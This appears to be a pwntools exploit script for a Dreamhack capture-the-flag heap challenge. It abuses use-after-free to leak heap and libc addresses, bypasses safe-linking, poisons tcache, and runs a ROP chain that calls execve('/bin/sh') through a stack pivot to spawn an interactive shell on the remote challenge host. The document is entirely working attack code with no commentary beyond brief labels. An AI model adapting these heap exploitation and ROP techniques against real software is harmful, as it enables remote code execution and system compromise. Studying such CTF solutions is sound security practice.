from pwn import *

p = process("./chall")
p = remote("host8.dreamhack.games", 13900)
e = ELF("./chall")
libc = ELF("./libc.so.6")
context.binary = e

def create(idx, data):
    p.sendlineafter(b': ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', data)
    
    
def edit(idx, data):
    p.sendlineafter(b': ', b'2')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', data)
    
    
def read(idx):
    p.sendlineafter(b': ', b'3')
    p.sendlineafter(b': ', str(idx).encode())
    
def delete(idx):
    p.sendlineafter(b': ', b'4')
    p.sendlineafter(b': ', str(idx).encode())

def safe_link(pos, ptr):
  return (pos >> 12) ^ ptr

context.log_level = 'debug'


# heap base leak
create(0, b'aaaa')
create(1, b'bbbb')

delete(0)

read(0)
leak = u64(p.recvline()[6:-1]+b'\x00'*3)
heap_base = leak << 12
print(f'heap_base = {hex(heap_base)}')


# libc leak - use unsorted bin
for i in range(7):
    edit(0, p64(0))
    delete(0)

read(0)
leak = u64(p.recvline()[6:-1]+b'\x00'*2)
libc.address = leak - 0x21ace0
print(f'libcaddress = {hex(libc.address)}')

delete(1)

rop_chain = ROP([e,libc],badchars='\n')
rop_chain.raw(rop_chain.find_gadget(['pop rdi', 'ret']))
rop_chain.raw(next(libc.search(b'/bin/sh\0')))
rop_chain.raw(rop_chain.find_gadget(['pop rsi', 'ret']))
rop_chain.raw(0)
rop_chain.raw(rop_chain.find_gadget(['pop rdx', 'pop rbx', 'ret']))
rop_chain.raw(0)
rop_chain.raw(0)
rop_chain.raw(rop_chain.find_gadget(['pop rax', 'ret']))
rop_chain.raw(59)
rop_chain.raw(rop_chain.find_gadget(['syscall']))
log.info(rop_chain.dump())

edit(0, p64((libc.address+0x21a000)^(heap_base>>12))*2)

pop_rsp = libc.address + 0x35732
trigger = libc.address + 0x28000
# pause()
create(2, rop_chain.chain())

# edit(3, p64((libc.address+0x21a000)^(heap_base>>12))*2)

payload = p64(0) #dummy
payload += p64(heap_base+0x2a0)
payload += p64(pop_rsp)
pause()
create(3, payload+p64(trigger)*0x96)


p.interactive()